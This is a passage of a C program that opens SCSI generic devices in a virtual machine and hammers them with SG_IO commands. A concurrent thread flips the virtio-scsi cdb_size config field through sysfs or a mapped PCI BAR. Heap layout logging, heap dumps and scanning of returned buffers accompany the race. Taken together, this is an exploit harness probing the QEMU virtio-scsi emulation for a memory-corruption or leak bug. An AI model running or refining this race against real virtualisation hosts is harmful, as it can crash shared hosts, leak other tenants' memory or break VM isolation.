    FILE *f = fopen(path, "re");
    if (!f) { perror("[tracefs] fopen trace_out"); return; }

    char line[8192];
    unsigned long long cur_id = 0, id_tmp = 0;
    bool in = false;
    flow_capture_t fc; memset(&fc, 0, sizeof(fc)); fc.driver_tag = fc.scheduler_tag = -1;
    int flows = 0;

    puts("\n=== Correlated SG_IO → SCSI → virtqueue (windowed by BEGIN/END SG_IO) ===");
    while (fgets(line, sizeof(line), f)) {
        /* Detect BEGIN SG_IO and grab its id (resilient to prefix formatting) */
        if (!in) {
            char *b = strstr(line, "BEGIN SG_IO id=");
            if (b && sscanf(b, "BEGIN SG_IO id=%llu", &id_tmp) == 1) {
                in = true; cur_id = id_tmp; memset(&fc, 0, sizeof(fc)); fc.driver_tag = fc.scheduler_tag = -1;
                keep_first(fc.begin, sizeof(fc.begin), line);
                continue;
            }
        }
        if (!in) continue;

        /* Inside the SG_IO window: capture the first occurrence of each key stage */
        if (strstr(line, "block_rq_issue"))            keep_first(fc.block_issue, sizeof(fc.block_issue), line);
        if (strstr(line, "scsi_dispatch_cmd_start"))   {
            keep_first(fc.scsi_start, sizeof(fc.scsi_start), line);
            char *p = strstr(line, "driver_tag=");
            if (p) sscanf(p, "driver_tag=%d", &fc.driver_tag);
            p = strstr(line, "scheduler_tag=");
            if (p) sscanf(p, "scheduler_tag=%d", &fc.scheduler_tag);
        }
        if (strstr(line, "virtio_scsi_queuecommand"))  keep_first(fc.v_scsi_qcmd, sizeof(fc.v_scsi_qcmd), line);
        if (strstr(line, "virtqueue_add_sgs"))         keep_first(fc.vq_add_sgs, sizeof(fc.vq_add_sgs), line);
        else if (strstr(line, "virtqueue_add(") || strstr(line, "virtqueue_add "))
                                                       keep_first(fc.vq_add, sizeof(fc.vq_add), line);
        if (strstr(line, "virtqueue_kick_prepare"))    keep_first(fc.vq_kick_prep, sizeof(fc.vq_kick_prep), line);
        if (strstr(line, "virtqueue_kick"))            keep_first(fc.vq_kick, sizeof(fc.vq_kick), line);
        if (strstr(line, "virtqueue_notify")) {
            keep_first(fc.vq_notify, sizeof(fc.vq_notify), line);
            if (fc.notify_ts == 0.0) fc.notify_ts = parse_fg_abstime(line);
        }
        if (strstr(line, "sgio_qemu:vq_pop"))          keep_first(fc.qemu_vq_pop, sizeof(fc.qemu_vq_pop), line);
        if (strstr(line, "sgio_qemu:vq_pop_ret"))      keep_first(fc.qemu_vq_pop_ret, sizeof(fc.qemu_vq_pop_ret), line);
        if (strstr(line, "virtqueue_get_buf")) {
            keep_first(fc.vq_get_buf, sizeof(fc.vq_get_buf), line);
            if (fc.getbuf_ts == 0.0) fc.getbuf_ts = parse_fg_abstime(line);
        }
        if (strstr(line, "scsi_dispatch_cmd_done"))    keep_first(fc.scsi_done, sizeof(fc.scsi_done), line);
        if (strstr(line, "block_rq_complete"))         keep_first(fc.block_complete, sizeof(fc.block_complete), line);

        /* Detect END SG_IO for the same id and print the correlated flow (resilient to prefixing) */
        if (in) {
            char *e = strstr(line, "END SG_IO id=");
            if (e && sscanf(e, "END SG_IO id=%llu", &id_tmp) == 1 && id_tmp == cur_id) {
                keep_first(fc.end, sizeof(fc.end), line);
                print_flow_capture(cur_id, &fc);
                in = false; cur_id = 0; flows++;
                if (flows >= 5) break;  /* avoid dumping huge logs */
            }
        }
    }
    /* If file ended without END, still print what we captured */
    if (in) print_flow_capture(cur_id, &fc);

    fclose(f);
}

/* ---------- build a basic CDB ---------- */

static int build_cdb(int kind, int alloc_len, uint8_t *cdb, int *cdb_len, int *dxfer_dir, int *xfer_len) {
    memset(cdb, 0, 32);
    switch (kind) {
        case CMD_INQUIRY:
            cdb[0] = 0x12;
            cdb[4] = (uint8_t)(alloc_len);
            *cdb_len = 6;
            *dxfer_dir = SG_DXFER_FROM_DEV;
            *xfer_len = alloc_len;
            return 0;
        case CMD_READCAP10:
            cdb[0] = 0x25;
            *cdb_len = 10;
            *dxfer_dir = SG_DXFER_FROM_DEV;
            *xfer_len = 8;
            return 0;
        case CMD_READCAP16: {
            cdb[0] = 0x9e;           // SERVICE ACTION IN(16)
            cdb[1] = 0x10;           // SA = READ CAPACITY(16)
            // LBA [2..9] left as zero from memset
            uint32_t al = (uint32_t)((alloc_len > 0) ? alloc_len : 32);
            // Allocation length (BE32) at bytes 10..13
            cdb[10] = (al >> 24) & 0xff;
            cdb[11] = (al >> 16) & 0xff;
            cdb[12] = (al >>  8) & 0xff;
            cdb[13] = (al      ) & 0xff;

            *cdb_len   = 16;
            *dxfer_dir = SG_DXFER_FROM_DEV;
            *xfer_len  = al;
            return 0;
        }
        case CMD_TUR:
            cdb[0] = 0x00;
            *cdb_len = 6;
            *dxfer_dir = SG_DXFER_NONE;
            *xfer_len = 0;
            return 0;
    }
    return -1;
}

/* ---------- CONFIG WRITER THREAD  ---------- */

#ifndef VIRTIO_SCSI_CFG_CDB_SIZE_OFF
// virtio-scsi config layout typically: ... sense_size @0x14, cdb_size @0x18
#define VIRTIO_SCSI_CFG_CDB_SIZE_OFF 0x18
#endif

typedef struct {
    const char *config_path;  // sysfs path to virtio device "config" file
    tracefs_t  *tf;           // optional: for trace_mark()
    int delay_us;             // delay before writing
    unsigned long flips;      // number of flips
    int flip_sleep_us;        // per-flip sleep (microseconds)
} config_writer_args_t;

/* ---------- SG_IO worker thread ---------- */
typedef struct {
    const char *sg_dev;
    int runtime_ms;     // how long to run the loop (ms)
    int thread_id;
    int cmd_mix_count;  // number of consecutive SG_IOs to submit per iteration
} sgio_worker_args_t;

static void *sgio_worker(void *arg) {
    sgio_worker_args_t *a = (sgio_worker_args_t *)arg;
    char tname[16]; snprintf(tname, sizeof(tname), "sgio-w%02d", a->thread_id);
    prctl(PR_SET_NAME, tname, 0, 0, 0);

    int fd = open(a->sg_dev, O_RDWR | O_CLOEXEC);
    if (fd < 0) { fprintf(stderr, "[WORKER%d] failed to open %s: %s\n", a->thread_id, a->sg_dev, strerror(errno)); return NULL; }

    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC_RAW, &start);

    uint8_t cdb[32]; int cdb_len, dxfer_dir, xfer_len;
    uint8_t databuf[256]; uint8_t sensebuf[128];

    while (1) {
        clock_gettime(CLOCK_MONOTONIC_RAW, &now);
        long elapsed_ms = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_nsec - start.tv_nsec) / 1000000;
        if (elapsed_ms >= a->runtime_ms) break;

        /* Submit a small sequence of varied commands */
        for (int k = 0; k < a->cmd_mix_count; ++k) {
            int kind = (k % 4 == 0) ? CMD_TUR : (k % 4 == 1) ? CMD_INQUIRY : (k % 4 == 2) ? CMD_READCAP10 : CMD_READCAP16;
            int alloc = (kind == CMD_INQUIRY) ? 96 : (kind == CMD_READCAP16) ? 32 : 0;
            if (build_cdb(kind, alloc, cdb, &cdb_len, &dxfer_dir, &xfer_len) != 0) continue;

            memset(databuf, 0, sizeof(databuf)); memset(sensebuf, 0, sizeof(sensebuf));
            sg_io_hdr_t hdr; memset(&hdr, 0, sizeof(hdr));
            hdr.interface_id = 'S'; hdr.cmdp = cdb; hdr.cmd_len = cdb_len;
            hdr.dxfer_direction = dxfer_dir; hdr.dxfer_len = xfer_len; hdr.dxferp = (xfer_len>0)?databuf:NULL;
            hdr.sbp = sensebuf; hdr.mx_sb_len = sizeof(sensebuf); hdr.timeout = 5000;

            int rc = ioctl(fd, SG_IO, &hdr);
            (void)rc; // ignore result; workers are best-effort
        }
    }

    close(fd);
    return NULL;
}

/* Synchronization to trigger config write during SG_IO */
static pthread_mutex_t cfg_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  cfg_cond  = PTHREAD_COND_INITIALIZER;
static int cfg_should_start = 0;

/* Implementation that accepts args and does pwrite with offset */
static void* config_writer_impl(void* arg) {
    config_writer_args_t *a = (config_writer_args_t *)arg;
    /* Wait for start signal */
    pthread_mutex_lock(&cfg_mutex);
    while (!cfg_should_start) pthread_cond_wait(&cfg_cond, &cfg_mutex);
    pthread_mutex_unlock(&cfg_mutex);
    if (a->delay_us > 0) usleep((useconds_t)a->delay_us);

    const off_t offset = (off_t)VIRTIO_SCSI_CFG_CDB_SIZE_OFF;
    const uint32_t vals[2] = { 32u, 128u };

    /* Try sysfs 'config' first */
    int fd = open(a->config_path, O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
        for (unsigned long i = 0; i < a->flips; ++i) {
            uint32_t v = vals[i & 1];
            ssize_t wr = pwrite(fd, &v, sizeof(v), offset);
            if (wr != (ssize_t)sizeof(v)) {
                if (a->tf && a->tf->available)
                    trace_mark(a->tf, "VIRTIO_RACE: sysfs pwrite failed i=%lu v=%u rc=%zd errno=%d", i, v, wr, errno);
            }
            if ((i & 4095UL) == 0 && a->tf && a->tf->available) {
                struct timespec ts; clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
                unsigned long long ns = (unsigned long long)ts.tv_sec * 1000000000ull + (unsigned long long)ts.tv_nsec;
                trace_mark(a->tf, "VIRTIO_RACE: flip=%lu value=%u t_mono_ns=%llu", i, v, ns);
            }
            if (a->flip_sleep_us > 0) usleep((useconds_t)a->flip_sleep_us);
        }
        close(fd);
        if (a->tf && a->tf->available) trace_mark(a->tf, "VIRTIO_RACE: completed %lu flips (sysfs)", a->flips);
        printf("[CONFIG] Completed %lu cdb_size toggles via sysfs (%s)\n", a->flips, a->config_path);
        return NULL;
    }

    /* Sysfs not available → MMIO (BAR) fallback */
    char pci_dir[PATH_MAX];
    /* Prefer to derive PCI dir from the SCSI device this program opened (global opts) */
    extern opts_t g_opts;
    const char *sgdev = g_opts.dev ? g_opts.dev : "/dev/sg1";
    if (sg_to_pci_dir(sgdev, pci_dir, sizeof(pci_dir)) != 0) {
        /* If sg path resolution fails, try to derive from the provided config_path parent */
        if (a->config_path && a->config_path[0]) {
            /* e.g., /sys/bus/virtio/devices/virtio0/config -> /sys/bus/pci/devices/0000:00:04.0 */
            char tmp[PATH_MAX]; strncpy(tmp, a->config_path, sizeof(tmp)-1); tmp[sizeof(tmp)-1] = '\0';
            /* walk up parents looking for a pci device directory (contains ':' in its name) */
            char *slash = strrchr(tmp, '/');
            while (slash) {
                *slash = '\0';
                struct stat st;
                char cand[PATH_MAX]; snprintf(cand, sizeof(cand), "%s/config", tmp);
                if (stat(cand, &st) == 0) { strncpy(pci_dir, tmp, sizeof(pci_dir)-1); pci_dir[sizeof(pci_dir)-1] = '\0'; break; }
                slash = strrchr(tmp, '/');
            }
        }
        if (pci_dir[0] == '\0') {
            strncpy(pci_dir, "/sys/bus/pci/devices/0000:00:04.0", sizeof(pci_dir)-1);
            pci_dir[sizeof(pci_dir)-1] = '\0';
        }
    }

    /* If device is transitional (older virtio), prefer sysfs virtio config path rather than PCI capability pokes */
    if (!is_modern_virtio(pci_dir)) {
        if (a->tf && a->tf->available) trace_mark(a->tf, "VIRTIO: transitional device; attempting sysfs config write for %s", pci_dir);
        char vcfg[PATH_MAX];
        if (find_virtio_scsi_config_path(vcfg, sizeof(vcfg)) == 0) {
            int vfd = open(vcfg, O_RDWR | O_CLOEXEC);
            if (vfd < 0) {
                perror("[CONFIG] open(virtio .../config)");
            } else {
                for (unsigned long i = 0; i < a->flips; ++i) {
                    uint32_t v = (i & 1) ? 128u : 32u;
                    ssize_t wr = pwrite(vfd, &v, sizeof(v), (off_t)VIRTIO_SCSI_CFG_CDB_SIZE_OFF);
                    if (wr != (ssize_t)sizeof(v)) perror("[CONFIG] pwrite(config)");
                    if ((i & 4095UL) == 0 && a->tf && a->tf->available) {
                        struct timespec ts; clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
                        unsigned long long ns = (unsigned long long)ts.tv_sec * 1000000000ull + (unsigned long long)ts.tv_nsec;
                        trace_mark(a->tf, "VIRTIO_RACE: transitional sysfs flip=%lu value=%u t_mono_ns=%llu", i, v, ns);
                    }
                    if (a->flip_sleep_us > 0) usleep((useconds_t)a->flip_sleep_us);
                }
                close(vfd);
                if (a->tf && a->tf->available) trace_mark(a->tf, "VIRTIO_RACE: completed %lu flips (sysfs transitional)", a->flips);
                printf("[CONFIG] Completed %lu cdb_size toggles via sysfs (transitional) %s\n", a->flips, vcfg);
                return NULL;
            }
        } else {
            fprintf(stderr, "[CONFIG] transitional virtio but no sysfs virtio config found for %s\n", pci_dir);
            return NULL;
        }
    }

    int mmrc = mmio_toggle_cdb_size_from_pci(pci_dir, a->flips, a->flip_sleep_us, a->tf);
    if (mmrc != 0) fprintf(stderr, "[CONFIG] MMIO fallback failed for %s\n", pci_dir);
    return NULL;
}

/* ---------- VIRTIO CONFIG DISCOVERY ---------- */

static int find_virtio_scsi_config_path(char *config_path, size_t path_size) {
    // Try multiple possible paths for virtio-scsi config
    const char *candidates[] = {
        "/sys/bus/virtio/devices/virtio*/config",
        "/sys/class/virtio-ports/virtio*/device/config",
        "/sys/class/scsi_generic/sg*/device/../../config",
        NULL
    };

    glob_t glob_result;
    for (int i = 0; candidates[i]; i++) {
        if (glob(candidates[i], GLOB_NOSORT, NULL, &glob_result) == 0) {
            if (glob_result.gl_pathc > 0) {
                strncpy(config_path, glob_result.gl_pathv[0], path_size - 1);
                config_path[path_size - 1] = '\0';
                globfree(&glob_result);
                return 0;
            }
            globfree(&glob_result);
        }
    }

    return -1;
}

/* Try to find a virtio-scsi config associated with a specific scsi host
    e.g. /sys/class/scsi_host/host<host_no>/device/virtio* /config (virtio* entry under host device) */
static int find_virtio_scsi_config_path_for_host(int host_no, char *config_path, size_t path_size) {
    if (host_no < 0) return -1;
    char base[PATH_MAX];
    snprintf(base, sizeof(base), "/sys/class/scsi_host/host%d/device", host_no);
    /* Use realpath to handle symlinks and nested paths, then walk up parents to find virtio* (look for a 'config' file) */
    char resolved[PATH_MAX];
    if (!realpath(base, resolved)) return -1;

    /* Walk up from resolved path to root, checking for virtio* entries in each parent */
    char cur[PATH_MAX]; strncpy(cur, resolved, sizeof(cur)); cur[sizeof(cur)-1] = '\0';
    int found = -1;
    while (1) {
        DIR *d = opendir(cur);
        if (!d) break;
        struct dirent *de;
        while ((de = readdir(d))) {
            if (de->d_name[0] == '.') continue;
            if (strncmp(de->d_name, "virtio", 6) == 0 || strstr(de->d_name, "virtio")) {
                char p[PATH_MAX];
                snprintf(p, sizeof(p), "%s/%s/config", cur, de->d_name);
                struct stat st;
                if (stat(p, &st) == 0) {
                    strncpy(config_path, p, path_size - 1);
                    config_path[path_size - 1] = '\0';
                    found = 0;
                    break;
                }
            }
        }
        closedir(d);
        if (found == 0) break;

        /* move one level up */
        char *slash = strrchr(cur, '/');
        if (!slash || slash == cur) break;
        *slash = '\0';
    }
    return found;
}

/* Wrapper to match requested signature in patch:
   Starts a thread routine with no args, discovers config path, then calls impl. */
void* config_writer(void* arg) __attribute__((unused));
void* config_writer(void* arg) {
    (void)arg;
    char config_path[256];
    int found = 0;
    for (int device_num = 0; device_num < 32; ++device_num) {
        snprintf(config_path, sizeof(config_path), "/sys/bus/virtio/devices/virtio%d/config", device_num);
        struct stat st;
        if (stat(config_path, &st) == 0) { found = 1; break; }
    }
    if (!found) {
        printf("[CONFIG] No virtio config found under /sys/bus/virtio/devices/ - skipping config access\n");
        return NULL;
    }
    int fd = open(config_path, O_WRONLY);
    if (fd < 0) { perror("[CONFIG] open failed"); return NULL; }

    /* NOTE: The user requested to use offsetof(struct VirtIOSCSIConfig, cdb_size).
       That struct is kernel/device-side; we don't have its definition here. We
       use a reasonable offset constant or assume offsetof == 0x18 in prior code.
       The original code used VIRTIO_SCSI_CFG_CDB_SIZE_OFF (0x18). We'll reuse that. */
#ifndef VIRTIO_SCSI_CFG_CDB_SIZE_OFF
#define VIRTIO_SCSI_CFG_CDB_SIZE_OFF 0x18
#endif
    uint32_t new_cdb_size = 128;
    off_t offset = (off_t)VIRTIO_SCSI_CFG_CDB_SIZE_OFF;
    usleep(100); // Delay to align with QEMU allocation
    ssize_t wr = pwrite(fd, &new_cdb_size, sizeof(new_cdb_size), offset);
    if (wr != (ssize_t)sizeof(new_cdb_size)) perror("[CONFIG] write failed");
    close(fd);
    printf("[CONFIG] cdb_size updated to %u (wrote %zd bytes)\n", new_cdb_size, wr);
    return NULL;
}

/* ---------- main ---------- */

int main(int argc, char **argv) {
    // Give the thread a clear name so it shows up in trace output
    prctl(PR_SET_NAME, "sgio", 0, 0, 0);

    opts_t opt;
    if (!parse_opts(argc, argv, &opt)) return 1;
    g_opts = opt;  // make available to trace helpers (for uprobes)

    printf("Device: %s\n", opt.dev);
    printf("Command: %s\n", (opt.cmd==CMD_INQUIRY)?"INQUIRY":(opt.cmd==CMD_READCAP10)?"READCAP10":(opt.cmd==CMD_READCAP16)?"READCAP16":"TUR");
    printf("AllocLen (data): %d  SenseLen: %d  Trace: %s  FuncGraph: %s  TraceSummary: %s  HeapLog: %s  HeapDump: %s (ctx=%d)\n",
           opt.alloc_len, opt.sense_len,
           opt.enable_trace ? "ON" : "off",
           opt.use_funcgraph ? "ON" : "off",
           opt.trace_summary ? "ON" : "off",
           opt.heap_log ? "ON" : "off",
           opt.heap_dump ? "ON" : "off",
           dump_ctx_bytes);

    // NEW: trace-only mode (attach trace + uprobes without issuing SG_IO)
    if (opt.trace_only) {
        tracefs_t tf = (tracefs_t){0};
        if (!tracefs_locate(&tf)) {
            printf("[tracefs] not found; cannot run --trace-only\n");
            return 1;
        }
        trace_begin(&tf, opt.use_funcgraph);   // will also add uprobes if --qemu-*
        printf("[tracefs] --trace-only: capturing for %d second(s)...\n", opt.trace_only_sleep);
        sleep(opt.trace_only_sleep);
        trace_end(&tf, opt.trace_out);
        if (opt.trace_summary) {
            summarize_trace_file(opt.trace_out);
            summarize_trace_correlated(opt.trace_out);
        }
        printf("Done. Trace saved to %s\n", opt.trace_out);
        return 0;
    }

    // open device
    int fd = open(opt.dev, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        printf("❌ Failed to open %s: errno=%d (%s)\n", opt.dev, errno, strerror(errno));
        return 1;
    }
    printf("✅ Opened %s (fd=%d)\n", opt.dev, fd);

    // Identify SCSI mapping (H:C:T:L)
    struct sg_scsi_id sid;
    memset(&sid, 0, sizeof(sid));
    if (ioctl(fd, SG_GET_SCSI_ID, &sid) == 0) {
        printf("SCSI ID: host=%d channel=%d target=%d lun=%d  scsi_type=%d  h_cmd_per_lun=%d  d_queue_depth=%d\n",
               sid.host_no, sid.channel, sid.scsi_id, sid.lun, sid.scsi_type,
               sid.h_cmd_per_lun, sid.d_queue_depth);
    } else {
        printf("⚠ ioctl(SG_GET_SCSI_ID) failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    // Discover backing block device for /dev/sgX (e.g., sda) for block-layer tracing
    char disk[64] = {0}, devnode[128] = {0};
    int dev_major = -1, dev_minor = -1;
    if (discover_block_disk_from_sg(opt.dev, disk, sizeof(disk), devnode, sizeof(devnode),
                                    &dev_major, &dev_minor) == 0) {
        if (dev_major >= 0)
            printf("Block backing: %s (node=%s, major=%d minor=%d)\n",
                   disk, devnode, dev_major, dev_minor);
        else
            printf("Block backing: %s (node=%s)\n", disk, devnode);
    } else {
        printf("Block backing: (not found via sysfs for %s)\n", opt.dev);
    }

    // confirm SG device and log version
    int ver = 0;
    if (ioctl(fd, SG_GET_VERSION_NUM, &ver) == 0) {
        printf("SG driver version: %d.%d.%d\n", ver/10000, (ver/100)%100, ver%100);
    } else {
        printf("⚠ ioctl(SG_GET_VERSION_NUM) failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    // build CDB & buffers
    uint8_t cdb[32]; int cdb_len=0, dxfer_dir=SG_DXFER_NONE, xfer_len=0;
    if (build_cdb(opt.cmd, opt.alloc_len, cdb, &cdb_len, &dxfer_dir, &xfer_len) != 0) {
        fprintf(stderr, "Failed to build CDB\n"); close(fd); return 1;
    }

    // ---- allocate data and sense buffers ----
    uint8_t *data = NULL, *sense = NULL;
    if (xfer_len > 0) {
        data = (uint8_t*)calloc(1, xfer_len);
        if (!data) { perror("calloc data"); close(fd); return 1; }
    }
    if (opt.sense_len > 0) {
        sense = (uint8_t*)calloc(1, opt.sense_len);
        if (!sense) { perror("calloc sense"); free(data); close(fd); return 1; }
    }

    // Optional heap layout analysis
    if (opt.heap_log) {
        if (data) { log_buffer_addresses("data_buffer", data, xfer_len); log_heap_metadata(data); }
        if (sense) { log_buffer_addresses("sense_buffer", sense, opt.sense_len); log_heap_metadata(sense); }
        if (data && sense) log_buffer_relationships(data, xfer_len, sense, opt.sense_len);
    }
    if (opt.heap_dump) {
        if (data) dump_heap_around_buffer(data, xfer_len);
        if (sense) dump_heap_around_buffer(sense, opt.sense_len);
    }

    // ---------- CDB structure logging ----------
    printf("\n=== CDB Structure ===\n");
    hexdump("CDB", cdb, cdb_len);
    printf("CDB length: %d (%s)\n", cdb_len, cdb_len_class(cdb_len));
    printf("CDB opcode: 0x%02x  interpreted as: %s\n", cdb[0], cdb_name(cdb, cdb_len));

    printf("\n=== SG_IO Submission Details ===\n");
    printf("Data buffer size: %d  Sense buffer size: %d\n", xfer_len, opt.sense_len);
    printf("Direction: %s\n",
           (dxfer_dir==SG_DXFER_FROM_DEV)?"SG_DXFER_FROM_DEV":
           (dxfer_dir==SG_DXFER_TO_DEV)?"SG_DXFER_TO_DEV":
           (dxfer_dir==SG_DXFER_NONE)?"SG_DXFER_NONE":"OTHER");

    // tracefs start
    tracefs_t tf = (tracefs_t){0};
    uint64_t corr_id = 0;
    if (opt.enable_trace) {
        if (!tracefs_locate(&tf)) {
            printf("[tracefs] not found; continuing without kernel trace\n");
        } else {
            trace_begin(&tf, opt.use_funcgraph);
            // Narrow events to *this* SCSI device + backing block device
            trace_apply_filters(&tf, &sid, disk, dev_major, dev_minor);

            // Correlation id for this SG_IO (pid ^ tid ^ monotonic_ns low bits)
            struct timespec _t0; clock_gettime(CLOCK_MONOTONIC_RAW, &_t0);
            uint64_t mono_ns0 = (uint64_t)_t0.tv_sec * 1000000000ull + (uint64_t)_t0.tv_nsec;
            corr_id = ((uint64_t)getpid() << 32) ^ (uint64_t)my_gettid() ^ mono_ns0;

            // Pretty CDB hex
            char cdb_hex[(32 * 3) + 1]; bytes_to_hex(cdb, cdb_len, cdb_hex, sizeof(cdb_hex));

            trace_mark(&tf,
                "BEGIN SG_IO id=%llu pid=%d tid=%ld dev=%s op=0x%02x(%s) cdb=[%s] cdb_len=%d "
                "data_len=%d sense_len=%d dir=%s t_mono_ns=%llu",
                (unsigned long long)corr_id, getpid(), my_gettid(), opt.dev,
                cdb[0], cdb_name(cdb, cdb_len), cdb_hex, cdb_len,
                xfer_len, opt.sense_len, dxfer_dir_name(dxfer_dir),
                (unsigned long long)mono_ns0);
        }
    }

    /* ---------- Discover config path and launch CONFIG writer thread ---------- */
    pthread_t config_thread;

    char discovered_cfg[PATH_MAX];
    int found = -1;
    /* Prefer explicit CLI-provided path if given */
    if (opt.virtio_cfg) {
        struct stat st;
        if (stat(opt.virtio_cfg, &st) == 0) {
            strncpy(discovered_cfg, opt.virtio_cfg, sizeof(discovered_cfg)-1);
            discovered_cfg[sizeof(discovered_cfg)-1] = '\0';
            found = 0;
            printf("[CONFIG] Using explicit virtio config path: %s\n", discovered_cfg);
        } else {
            fprintf(stderr, "[CONFIG] --virtio-config provided but not accessible: %s\n", opt.virtio_cfg);
        }
    }
    /* Prefer host-specific discovery if SG host is available and no explicit path */
    if (found != 0) {
        found = find_virtio_scsi_config_path_for_host(sid.host_no, discovered_cfg, sizeof(discovered_cfg));
        if (found == 0) {
            printf("[CONFIG] Discovered virtio config for host %d: %s\n", sid.host_no, discovered_cfg);
        } else if (find_virtio_scsi_config_path(discovered_cfg, sizeof(discovered_cfg)) == 0) {
            printf("[CONFIG] Discovered virtio config (generic): %s\n", discovered_cfg);
            found = 0;
        } else {
            /* fallback per user instruction */
            snprintf(discovered_cfg, sizeof(discovered_cfg), "/sys/bus/virtio/devices/virtio0/config");
            printf("[CONFIG] Discovery failed; falling back to %s\n", discovered_cfg);
            found = 0;
        }
    }

    /* prepare args on the stack; they remain valid until we pthread_join below */
    config_writer_args_t cfg_args;
    cfg_args.config_path = discovered_cfg;
    cfg_args.tf = (opt.enable_trace && tf.available) ? &tf : NULL;
    cfg_args.delay_us = 0; /* tight toggling; alignment sleep disabled by default */
    cfg_args.flips = opt.flips;
    cfg_args.flip_sleep_us = opt.flip_sleep_us;

    int config_thread_ok = (pthread_create(&config_thread, NULL, config_writer_impl, &cfg_args) == 0);

    /* Spawn SG_IO worker threads that will hammer the device for ~1.5s */
    const int worker_count = 4; /* can be 4-8 per request */
    pthread_t workers[8];
    sgio_worker_args_t wargs[8];
    int worker_runtime_ms = 1500; // run workers for 1.5s

    for (int i = 0; i < worker_count; ++i) {
        wargs[i].sg_dev = opt.dev;
        wargs[i].runtime_ms = worker_runtime_ms;
        wargs[i].thread_id = i;
        wargs[i].cmd_mix_count = 8; /* submit a small burst each loop */
        if (pthread_create(&workers[i], NULL, sgio_worker, &wargs[i]) != 0) {
            fprintf(stderr, "[MAIN] failed to create worker %d\n", i);
        }
    }

    // timing
    struct timespec ts0, ts1, rt0, rt1;
    clock_gettime(CLOCK_REALTIME, &rt0);
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts0);

    /* Signal config writer to start the config write now (so it overlaps SG_IO) */
    if (config_thread_ok) {
        pthread_mutex_lock(&cfg_mutex);
        cfg_should_start = 1;
        pthread_cond_signal(&cfg_cond);
        pthread_mutex_unlock(&cfg_mutex);
    }

    // issue SG_IO (single primary ioctl while workers run)
    sg_io_hdr_t hdr; memset(&hdr, 0, sizeof(hdr));
    hdr.interface_id = 'S';
    hdr.dxfer_direction = dxfer_dir;
    hdr.cmdp = cdb; hdr.cmd_len = cdb_len;
    hdr.dxfer_len = xfer_len; hdr.dxferp = data;
    hdr.sbp = sense; hdr.mx_sb_len = opt.sense_len;
    hdr.timeout = 20000; // ms

    errno = 0;                     // clear errno to avoid stale values
    int rc = ioctl(fd, SG_IO, &hdr);
    int saved_errno = errno;

    clock_gettime(CLOCK_MONOTONIC_RAW, &ts1);
    clock_gettime(CLOCK_REALTIME, &rt1);
    double dur_ms = (ts1.tv_sec - ts0.tv_sec)*1000.0 + (ts1.tv_nsec - ts0.tv_nsec)/1e6;
    double dur_us = (ts1.tv_sec - ts0.tv_sec)*1e6 + (ts1.tv_nsec - ts0.tv_nsec)/1e3;

    /* 🎯 Report the precise SG_IO window to compare against CONFIG write */
    printf("[TIMING] SG_IO window: %ld.%09ld → %ld.%09ld\n",
           (long)ts0.tv_sec, ts0.tv_nsec, (long)ts1.tv_sec, ts1.tv_nsec);

    /* Join config writer thread (per patch) */
    if (config_thread_ok) {
        pthread_join(config_thread, NULL);
        printf("[CONFIG] Config writer thread joined\n");
    }

    /* Join worker threads */
    for (int i = 0; i < worker_count; ++i) pthread_join(workers[i], NULL);
    printf("[WORKERS] Joined %d workers\n", worker_count);

    if (opt.enable_trace && tf.available) {
        uint64_t mono_ns1 = (uint64_t)ts1.tv_sec * 1000000000ull + (uint64_t)ts1.tv_nsec;

        trace_mark(&tf,
            "END SG_IO id=%llu rc=%d errno=%d status=0x%02x host=0x%02x driver=0x%02x "
            "masked=0x%02x info=0x%08x resid=%d dur_us=%.0f t_mono_ns=%llu",
            (unsigned long long)corr_id,
            rc, (rc < 0 ? saved_errno : 0),            // only report errno if rc<0
            hdr.status, hdr.host_status,
            hdr.driver_status, hdr.masked_status, hdr.info, hdr.resid,
            dur_us, (unsigned long long)mono_ns1);

        trace_end(&tf, opt.trace_out);
        if (opt.trace_summary) summarize_trace_file(opt.trace_out);
        if (opt.trace_summary) summarize_trace_correlated(opt.trace_out);
    }

    printf("\n=== Timing ===\n");
    printf("Wallclock start: %ld.%09ld  end: %ld.%09ld\n",
           (long)rt0.tv_sec, rt0.tv_nsec, (long)rt1.tv_sec, rt1.tv_nsec);
    printf("Duration: %.3f ms (%.0f us)\n", dur_ms, dur_us);

    // ---- SG_IO result ----
    printf("\n=== SG_IO Result ===\n");
    printf("ioctl rc=%d", rc);
    if (rc < 0) printf(" errno=%d (%s)\n", saved_errno, strerror(saved_errno));
    else        printf(" (success)\n");
    printf("status=0x%02x  host_status=0x%02x  driver_status=0x%02x  masked_status=0x%02x  info=0x%08x resid=%d\n",
           hdr.status, hdr.host_status, hdr.driver_status, hdr.masked_status, hdr.info, hdr.resid);

    // Data / Sense
    if (hdr.sb_len_wr > 0 && sense) hexdump("Sense data", sense, hdr.sb_len_wr);
    if (xfer_len > 0 && data) {
        size_t dump = (xfer_len < 256 ? xfer_len : 256);
        hexdump("Data buffer (first 256B)", data, dump);
        scan_patterns(data, xfer_len);

        // Interpret well-known responses
        if (opt.cmd == CMD_READCAP16)      decode_readcap16(data, xfer_len);
        else if (opt.cmd == CMD_READCAP10) decode_readcap10(data, xfer_len);
        else if (opt.cmd == CMD_INQUIRY)   decode_inquiry(data, xfer_len);
    }

    free(data); free(sense); close(fd);
    printf("\nDone. %s\n", (opt.enable_trace) ? "Trace saved; summary printed if --trace-summary." : "Kernel trace disabled.");
    return (rc == 0) ? 0 : 2;
}

/* ---------- VIRTIO DEVICE BAR ACCESS ---------- */

typedef struct {
    void *bar_base;
    size_t bar_size;
    uint32_t *cdb_size_reg;  // pointer to cdb_size field in config space
} virtio_device_t;

static int map_virtio_device_bar(const char *sgdev, virtio_device_t *vdev) __attribute__((unused));
static int map_virtio_device_bar(const char *sgdev, virtio_device_t *vdev) {
    // Find PCI device for this SCSI device
    char pci_path[512];
    snprintf(pci_path, sizeof(pci_path), 
             "/sys/class/scsi_generic/%s/device/../../../resource0", 
             strrchr(sgdev, '/') + 1);
    
    int fd = open(pci_path, O_RDWR);
    if (fd < 0) return -1;
    
    // Map the virtio config BAR (typically BAR0, first 4KB)
